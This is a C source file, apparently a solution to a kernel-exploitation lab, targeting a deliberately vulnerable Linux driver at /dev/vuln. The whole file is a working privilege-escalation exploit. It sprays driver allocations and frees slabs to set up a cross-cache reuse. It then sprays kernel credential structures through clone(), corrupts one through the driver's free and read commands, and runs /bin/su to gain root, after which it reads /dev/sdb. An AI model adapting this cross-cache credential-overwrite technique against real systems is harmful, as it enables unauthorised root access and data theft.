#define _GNU_SOURCE
#include <fcntl.h>      // for open, O_RDWR
#include <sched.h>      // for clone, CLONE_FILES, CLONE_FS, CLONE_SIGHAND
#include <stdatomic.h>  // for atomic_bool, atomic_compare_exchange_strong
#include <stdbool.h>    // for false, true, bool
#include <stdint.h>     // for uintptr_t
#include <stdio.h>      // for NULL, size_t, perror, puts
#include <stdlib.h>     // for exit, system, EXIT_FAILURE, EXIT_SUCCESS
#include <sys/ioctl.h>  // for ioctl
#include <sys/types.h>  // for uid_t, pid_t
#include <unistd.h>     // for close, geteuid, execve, fork, getuid, setgid

#define CMD_ALLOC	0xf000
#define CMD_READ	0xf001
#define CMD_FREE	0xf002

typedef struct {
	int id;
	size_t size;
	char *data;
} request_t;

#define objs_per_slab 21
#define cpu_partial 120
#define dev_spray (objs_per_slab * (cpu_partial + 1))
#define cred_spray 0x20

struct cred {
	unsigned long usage;
	uid_t uid;
	uid_t gid;
	uid_t suid;
	uid_t sgid;
	uid_t euid;
	uid_t egid;
	uid_t fsuid;
	uid_t fsgid;
};

static atomic_bool is_explloit = false;
static atomic_bool is_root = false;
static size_t page_size;
static int dev = -1;

static void fatal(const char *err)
{
	perror(err);
	exit(EXIT_FAILURE);
}

static void dev_alloc(int id)
{
	request_t req;
	req.id = id;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_ALLOC, &req);
}

static void dev_read(int id, uintptr_t data, size_t len)
{
	request_t req;
	req.id = id;
	req.size = len;
	req.data = (char *)data;

	ioctl(dev, CMD_READ, &req);
}

static void dev_free(int id)
{
	request_t req;
	req.id = id;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_FREE, &req);
}

static int get_root(void *arg)
{
	bool expected = false;
	(void)arg;

	while (!atomic_load(&is_explloit))
		sleep(1);

	if (geteuid() == 0) {
		setuid(0);
		setgid(0);
		if (atomic_compare_exchange_strong(&is_root, &expected, true)) {
			puts("[+] get r00t!");
			system("cat /dev/sdb");
		} else {
			goto out;
		}
	} else {
		goto out;
	}

out:
	return 0;
}

int main(void)
{
	struct cred cred;
	int victim = -1;

	page_size = sysconf(_SC_PAGESIZE);

	dev = open("/dev/vuln", O_RDWR);
	if (dev == -1)
		fatal("[-] open");

	for (int i = 0; i < dev_spray; ++i)
		dev_alloc(i);
	dev_alloc(dev_spray);

	for (int i = 0; i < dev_spray; i += objs_per_slab) {
		if (i % (objs_per_slab * 2) == 0) {
			for (int j = i; j < i + objs_per_slab; ++j)
				dev_free(j);
		} else {
			dev_free(i);
		}
	}

	char stack[cred_spray][0x1000];
	for (int i = 0; i < cred_spray; i++) {
		int ret =
			clone(get_root, &stack[i][0xfff],
			      CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND,
			      NULL);
		if (ret == -1)
			fatal("[-] clone");
	}

	for (int i = 0; i < dev_spray; i += objs_per_slab * 2) {
		for (int j = i; j < i + objs_per_slab; ++j) {
			dev_read(j, (uintptr_t)&cred, sizeof(cred));
			if (cred.uid == getuid() && cred.euid == geteuid()) {
				victim = j;
				dev_free(j);
			}
		}
	}

	if (victim == -1)
		fatal("[-] cross cache failed");

	for (int i = 0; i < cred_spray; ++i) {
		pid_t pid = fork();
		if (pid == 0) {
			close(0);
			close(1);
			close(2);
			char *argv[] = { "/bin/su", NULL };
			execve(argv[0], argv, NULL);
		}
	}

	atomic_store(&is_explloit, true);
	return EXIT_SUCCESS;
}
